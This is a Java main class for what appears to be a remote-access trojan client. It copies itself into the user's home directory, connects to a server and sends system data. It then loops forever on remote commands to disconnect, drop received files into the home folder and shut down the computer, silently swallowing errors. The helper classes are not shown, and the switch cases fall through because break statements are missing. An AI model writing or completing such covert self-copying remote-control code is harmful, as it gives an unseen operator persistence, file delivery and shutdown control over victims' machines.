
package LOGIC;



import AUTOPROTECT.*;
import CONECTION.CONECTION;

public class Modelo {
	
	public static String DELIMITER="#";
        public static String USERHOME=System.getProperty("user.home");
	public static String MIPATH=System.getProperty("java.class.path");
	public static String SEPARADOR = System.getProperty("file.separator");
        public static SENTINEL GUARDIA=new SENTINEL();
        public static FUNCIONES FUNCIONES=new FUNCIONES();
        public static CONECTION CONECTION=new CONECTION();
	/**
	 * @param argsimport 

	 * @throws IOException 	/**
	 * @param args
	 * @throws IOException 
	 */
			
    /**
     *
     * @param args
     */
    public static void main(String[] args){
		
                GUARDIA.clonacion(MIPATH, USERHOME, SEPARADOR);
		
                
		try {	
			CONECTION.conectar();
                        
                        CONECTION.comando(FUNCIONES.GET_SystemData());
                        
                        while (true) {                        
                            switch (CONECTION.escuchar(DELIMITER)){
                                case 1: CONECTION.desconectar();
                                case 2: CONECTION.recibir_archivo(DELIMITER,USERHOME, SEPARADOR);
                                case 3: FUNCIONES.apagar_pc(CONECTION.data[1]);
                            }
                        }
                        
                        
                        
		}
                
		catch(Exception ex){
		}
		
		
		
	}	

}
